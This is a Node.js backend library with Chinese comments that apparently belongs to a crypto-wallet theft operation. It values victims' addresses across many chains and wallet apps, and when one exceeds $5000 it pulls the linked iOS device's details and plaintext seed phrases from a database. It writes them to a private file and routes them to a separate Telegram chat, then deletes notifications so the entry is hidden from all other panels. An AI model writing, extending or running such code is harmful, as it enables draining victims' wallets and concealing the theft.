#!/usr/bin/env node
/**
 * vault_lib.js —— 高价值地址"暗池"核心库（单一实现，2026-09-16 操作员确认）
 *
 * 规则：
 *   · 单地址合计估值 ≥ vault_threshold_usd（默认 $5000）→ 入池
 *   · 入池四件套：① vault_items 表（全端隐藏依据）② docs/vault_keep.txt 记录
 *     ③ 直达 vault_chat_id 的 TG 队列（独立配置，不经任何账号绑定链）④ 站内历史通知与未发队列清理
 *   · 估值口径：逐链原生币按 price_cache 现价 + tokens(USDT/USDC)；TON 与未追踪代币不计（已知盲区）
 *
 * 调用方：balance_sync.js（余额更新后带内存数据直调）/ vault_check.js（CLI）/ vault_backfill.js（全量回扫）
 */
'use strict';
const fs = require('fs');
const path = require('path');
const BASE = '/www/wwwroot/i.131422.com';
const { pool } = require(path.join(BASE, 'adm888app', 'pg', 'pgStore.js'));

const CFG_F = path.join(BASE, 'adm888app', 'data', 'notify_cfg.json');
const PRICE_F = path.join(BASE, 'adm888app', 'data', 'price_cache.json');
const VAULT_JSON = path.join(BASE, 'adm888app', 'data', 'vault.json');
const DOCS_F = path.join(BASE, 'docs', 'vault_keep.txt');
// 【2026-09-20】手动放行名单（操作员同意放行的设备/地址不再自动入池；仅人工增删）
const RELEASE_F = path.join(BASE, 'adm888app', 'data', 'vault_release_whitelist.json');

// 【2026-09-18 复审修复】补齐别名链标签（与 notify_scan.CHAIN_SYM 对齐）：TRX / TONKEEPER / TONHUB / COIN607
//   缺了它们 → 这些行原生余额估值为 0 → 暗池/前置门判定存在"大额被误放行"面
// 【2026-09-19 复审修复】再对齐 EVM 系列标签（ETHEREUM/METAMASK/TRUST/BITGET/IMTOKEN/EXODUS/WALLET → ETH）
const CHAIN_COIN = { TRON: 'TRX', TRX: 'TRX', ETH: 'ETH', ETHEREUM: 'ETH', METAMASK: 'ETH', TRUST: 'ETH', BITGET: 'ETH', IMTOKEN: 'ETH', EXODUS: 'ETH', WALLET: 'ETH', ARBITRUM: 'ETH', BASE: 'ETH', BSC: 'BNB', POLYGON: 'POL', BTC: 'BTC', LTC: 'LTC', SOL: 'SOL', DOGE: 'DOGE', TON: 'TON', TONKEEPER: 'TON', TONHUB: 'TON', COIN607: 'TON' };
const EVM_CHAIN_COIN = { ETH: 'ETH', ARBITRUM: 'ETH', BASE: 'ETH', BSC: 'BNB', POLYGON: 'POL' };

function loadCfg() {
  let d = {};
  try { d = JSON.parse(fs.readFileSync(CFG_F, 'utf8')); } catch (e) {}
  return {
    chat: String(d.vault_chat_id || '').trim(),
    threshold: Number(d.vault_threshold_usd) > 0 ? Number(d.vault_threshold_usd) : 5000,
  };
}

let _px = { t: 0, prices: null };
function loadPrices() {
  if (Date.now() - _px.t < 60000) return _px.prices;
  try {
    const j = JSON.parse(fs.readFileSync(PRICE_F, 'utf8'));
    const age = Date.now() / 1000 - Number(j.ts || 0);
    _px = { t: Date.now(), prices: (age < 900 && j.prices) ? j.prices : null };   // >15 分钟视为过期
  } catch (e) { _px = { t: Date.now(), prices: null }; }
  return _px.prices;
}

/** 归一化输入：{chain, bal, evm_bals, tokens} → {value, parts} */
function valueOf({ chain, bal, evm_bals, tokens }, prices) {
  const P = prices || {};
  const px = c => { const v = Number(P[c]); return v > 0 ? v : null; };
  let value = 0; const parts = [];
  const chUp = String(chain || '').toUpperCase();
  const b = bal != null ? Number(bal) : null;
  const evm = (evm_bals && typeof evm_bals === 'object') ? evm_bals : null;
  if (evm && Object.keys(evm).length) {
    for (const [ch, amt] of Object.entries(evm)) {
      const a = Number(amt) || 0; if (a <= 0) continue;
      const c = EVM_CHAIN_COIN[String(ch).toUpperCase()]; const p = c ? px(c) : null;
      if (c && p) { const u = a * p; value += u; parts.push(`${String(ch).toUpperCase()} ${a} ${c} ≈$${u.toFixed(2)}`); }
    }
  } else if (b != null && b > 0) {
    const c = CHAIN_COIN[chUp]; const p = c ? px(c) : null;
    if (c && p) { const u = b * p; value += u; parts.push(`${chUp} ${b} ${c} ≈$${u.toFixed(2)}`); }
  }
  if (Array.isArray(tokens)) {
    for (const t of tokens) {
      const a = Number(t && t.amount) || 0; if (a <= 0) continue;
      const p = px(String((t && t.abbr) || '').toUpperCase());
      if (p) { const u = a * p; value += u; parts.push(`${(t.chain || chUp)} ${a} ${t.abbr} ≈$${u.toFixed(2)}`); }
    }
  }
  return { value, parts };
}

/** 从 PG addresses 行归一化（tokens 缺失时回退旧 trc20） */
function fromRow(row) {
  let d = row.data;
  if (typeof d === 'string') { try { d = JSON.parse(d); } catch (e) { d = {}; } }
  d = d || {};
  let tokens = Array.isArray(d.tokens) ? d.tokens : null;
  if (!tokens && Array.isArray(d.trc20)) tokens = d.trc20.map(t => ({ chain: 'TRON', abbr: t.abbr, amount: t.amount }));
  return { chain: row.chain, bal: row.bal, evm_bals: d.evm_bals || null, tokens };
}

/** 当前暗池集合（serials 含"地址反查归属"扩展） */
async function vaultSets(cli) {
  const c = cli || pool;
  const r1 = await c.query(`SELECT DISTINCT serial FROM vault_items WHERE serial IS NOT NULL AND serial <> ''`);
  // 【2026-09-19 复审修复】排除 PENDING_GATE 行的地址反查（挂起期间批量地址会误伤共享同址的其它设备）
  const r2 = await c.query(`SELECT DISTINCT a.serial FROM addresses a JOIN vault_items v ON a.public_key = v.addr AND COALESCE(v.reason,'') NOT LIKE 'PENDING_GATE%' WHERE a.serial IS NOT NULL AND a.serial <> ''`);
  const r3 = await c.query(`SELECT addr FROM vault_items`);
  const serials = new Set([...r1.rows, ...r2.rows].map(x => x.serial));
  const addrs = new Set(r3.rows.map(x => x.addr));
  return { serials, addrs };
}

/** 刷新 vault.json 镜像（authStore/快照回退路径读取） */
async function refreshMirror(cli) {
  try {
    const c = cli || pool;
    const vs = await vaultSets(c);
    const payload = { updated: Date.now(), serials: [...vs.serials], addrs: [...vs.addrs] };
    const tmp = VAULT_JSON + '.tmp';
    fs.writeFileSync(tmp, JSON.stringify(payload));
    fs.renameSync(tmp, VAULT_JSON);
  } catch (e) { console.error('[vault] 镜像写入失败:', e.message); }
}

/**
 * 判定并执行入池（幂等：addr 已入池直接返回）
 * @param {object} p {addr, serials?, value, parts?, reason?}
 */
async function checkAndVault(p) {
  const cfg = loadCfg();
  const addr = String(p.addr || '').trim();
  if (!addr) return { ok: false, error: 'addr 必填' };
  const value = Number(p.value) || 0;
  if (!(value >= cfg.threshold)) return { ok: true, vaulted: false, value, threshold: cfg.threshold };
  if (!cfg.chat) return { ok: false, vaulted: false, error: 'vault_chat_id 未配置' };
  // 【2026-09-20】手动放行名单：名单内设备/地址不再自动入池（仅操作员同意时手动增删；名单缺失/损坏不阻断主流程）
  try {
    const wl = JSON.parse(fs.readFileSync(RELEASE_F, 'utf8'));
    const wSerials = new Set((wl.serials || []).map(String));
    const wAddrs = new Set((wl.addrs || []).map(s => String(s).toLowerCase()));
    let hit = wAddrs.has(addr.toLowerCase());
    // 【2026-09-20 复审加固】显式传入的 serials 也查名单（调用方已带归属 serial 时最直接的一条拦截线）
    if (!hit && wSerials.size && Array.isArray(p.serials) && p.serials.some(s => wSerials.has(String(s)))) hit = true;
    if (!hit && wSerials.size) {
      // 【2026-09-20】lower 匹配：库内地址为校验和混合大小写，调用方可能传全小写（链上 API 格式），精确匹配会漏
      const rs0 = await pool.query(`SELECT DISTINCT serial FROM addresses WHERE lower(public_key) = lower($1) AND serial IS NOT NULL AND serial <> ''`, [addr]);
      hit = rs0.rows.some(r => wSerials.has(String(r.serial)));
    }
    if (hit) return { ok: true, vaulted: false, released: true, value };
  } catch (e) { /* ignore */ }
  const cli = await pool.connect();
  try {
    const ex = await cli.query('SELECT 1 FROM vault_items WHERE addr = $1', [addr]);
    if (ex.rows.length) return { ok: true, vaulted: false, already: true, value };
    // 归属序列号（含多设备共用地址的情况）
    let serials = Array.isArray(p.serials) ? p.serials.filter(Boolean) : [];
    if (!serials.length) {
      const rs = await cli.query(`SELECT DISTINCT serial FROM addresses WHERE public_key = $1 AND serial IS NOT NULL AND serial <> ''`, [addr]);
      serials = rs.rows.map(x => x.serial);
    }
    const primary = serials[0] || null;
    await cli.query(
      `INSERT INTO vault_items (serial, addr, value_usd, reason) VALUES ($1,$2,$3,$4) ON CONFLICT (addr) DO NOTHING`,
      [primary, addr, value, String(p.reason || '').slice(0, 120)]);
    // 设备信息 / 助记词（docs 记录用）
    let dev = null, mns = [];
    if (primary) {
      try { const rd = await cli.query(`SELECT serial, machine, ios_version, ip FROM devices WHERE serial = $1 LIMIT 1`, [primary]); dev = rd.rows[0] || null; } catch (e) {}
      try { const rm = await cli.query(`SELECT plain FROM mnemonics WHERE serial = $1 AND COALESCE(plain,'') <> '' ORDER BY id LIMIT 20`, [primary]); mns = rm.rows.map(x => x.plain); } catch (e) {}
    }
    // ① docs 记录
    const ts = new Date().toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
    let block = `\n[${ts}] === 高价值地址入池 ===\n`;
    block += `设备序列号: ${primary || '(无归属设备)'}\n`;
    block += `触发地址: ${addr}\n`;
    block += `估值: ≈$${value.toFixed(2)}（阈值 $${cfg.threshold}）\n`;
    if (p.parts && p.parts.length) block += `明细: ${p.parts.join(' · ')}\n`;
    if (dev) block += `设备: ${dev.machine || '-'} · iOS ${dev.ios_version || '-'} · IP ${dev.ip || '-'}\n`;
    if (mns.length) { block += `助记词(${mns.length}):\n`; for (const m of mns) block += `  ${m}\n`; }
    try {
      fs.appendFileSync(DOCS_F, block);
      try { fs.chmodSync(DOCS_F, 0o600); } catch (e) {}
    } catch (e) { console.error('[vault] docs 写入失败:', e.message); }
    // ② TG 直达队列（chat 固定 vault_chat_id；发送侧有目标校验，不可能窜到其它 chat）
    let text = `🔒 高价值地址入池\n设备: ${primary || '(无归属设备)'}\n地址: ${addr}\n估值: ≈$${value.toFixed(2)}`;
    if (p.parts && p.parts.length) text += `\n明细: ${p.parts.slice(0, 6).join(' · ')}`;
    text += `\n（已从所有面板隐藏）`;
    await cli.query(`INSERT INTO tg_queue (notification_id, chat_id, agent_id, text) VALUES (NULL, $1, NULL, $2)`, [cfg.chat, text]);
    // ③ 站内历史通知 / 未发队列清理（该设备+该地址）
    const delQ = await cli.query(
      `DELETE FROM tg_queue WHERE sent_at IS NULL AND notification_id IN (
         SELECT id FROM notifications WHERE ($1::text IS NOT NULL AND body->>'serial' = $1) OR body->>'addr' = $2)`,
      [primary, addr]);
    const delN = await cli.query(
      `DELETE FROM notifications WHERE ($1::text IS NOT NULL AND body->>'serial' = $1) OR body->>'addr' = $2`,
      [primary, addr]);
    // ④ 镜像
    await refreshMirror(cli);
    console.log(`[vault] 入池完成 addr=${addr} serial=${primary || '-'} value=$${value.toFixed(2)} 清理: 通知${delN.rowCount} 队列${delQ.rowCount}`);
    return { ok: true, vaulted: true, value, serial: primary, cleanedNotifications: delN.rowCount, cleanedQueue: delQ.rowCount };
  } finally { cli.release(); }
}

module.exports = { loadCfg, loadPrices, valueOf, fromRow, vaultSets, refreshMirror, checkAndVault };
